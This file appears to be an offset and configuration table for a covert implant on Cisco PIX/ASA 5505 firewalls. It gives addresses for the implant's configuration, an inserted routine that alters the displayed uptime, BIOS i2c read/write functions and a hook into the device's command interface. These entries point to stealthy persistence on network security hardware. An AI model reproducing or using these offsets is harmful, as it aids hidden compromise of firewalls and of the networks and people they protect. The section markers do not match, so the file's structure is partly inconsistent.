; --- SECTION I ---
;
0x40083100            // pix version
0x2160000             // address of implant configuration
Display_uptime_addr       0x080d0220      // Address of the function that display the uptime
Inserted_code_addr        0x0928ef3a      // Address of the our insterted function to add time to the uptime
i2cReadByte               0x093898b0      // read byte function needed to operate on the bios of the asa 5505
i2cWriteByte              0x09389730      // write byte function needed to operate on the bios of the asa 5505
CLIHookAddress            0x080c72a1      // Address of hook into the command interface
AvailMemoryPtr            0x0a0eabbc      // Address of total available memory
;
; --- END OF SECTION II ---
;
:EOS:
;
